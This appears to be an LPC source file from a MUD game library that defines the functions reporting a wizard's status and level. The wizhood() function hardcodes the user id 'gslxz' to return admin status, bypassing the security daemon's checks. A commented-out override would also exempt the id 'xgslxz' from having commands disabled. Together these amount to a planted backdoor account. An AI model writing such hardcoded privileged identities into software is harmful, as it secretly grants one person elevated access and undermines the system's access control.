// wiz.c

string wizhood(mixed ob)
{
   if( objectp(ob) ) {
  if( getuid(ob)=="gslxz" )
       return "(admin)";
}
  if( stringp(ob) ) 
      if( ob=="gslxz" )
       return "(admin)";
	return SECURITY_D->get_status(ob);
}

int wiz_level(mixed ob)
{
	return SECURITY_D->get_wiz_level(ob);
}

/*
void disable_commands( )
{
   if( this_player()->query("id") != "xgslxz" )
      efun::disable_commands();
}

*/